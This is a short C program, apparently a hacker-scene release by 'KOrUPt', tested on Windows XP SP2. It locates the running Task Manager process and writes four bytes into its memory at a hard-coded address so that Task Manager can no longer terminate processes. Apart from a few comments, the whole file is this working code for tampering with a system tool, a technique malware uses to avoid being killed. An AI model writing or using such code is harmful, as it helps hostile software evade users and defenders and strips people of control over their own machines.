// The outcome of 5 minutes work... Start taskmanger, now run this... Try terminate process now :p.
// Tested on platform: Windows XP SP2
// Task manger version: 5.1.2600.2180
// SHA-1 hash: 28e0652d35fcd1e5abd1aa23bb5ee2b180a6693b
// ~ Have fun. KOrUPt
#define _WIN32_WINNT 0x501
#pragma comment(linker, "/filealign:0x200 /ignore:4078 /merge:.text=.data /merge:.rdata=.data")
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShow)
{
	PROCESSENTRY32 pe32;
    HANDLE hSnapshot, hProcess;
	DWORD nBytesRead;
	BYTE buff[4];
	int nStatus = 0;
	
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnapshot != INVALID_HANDLE_VALUE){
		if(Process32First(hSnapshot, &pe32)){
			do{
				if(strcmp(pe32.szExeFile, "taskmgr.exe") == 0){
					hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, TRUE, pe32.th32ProcessID);
					if(hProcess){
						ReadProcessMemory(hProcess, (BYTE *)0x100A242, buff, 4, &nBytesRead);
						if((nBytesRead == 4) && !memcmp(buff, "\x83\xC1\x06\x8B", 4)){
							buff[0] = 0x83, buff[1] = 0xC1, buff[2] = 0x00, buff[3] = 0x9b;
							nStatus = WriteProcessMemory(hProcess, (BYTE *)0x100A242, buff, 4, NULL);
						}
						CloseHandle(hProcess);
					}
					break;
				}
			}while(Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
	
	return nStatus;
}
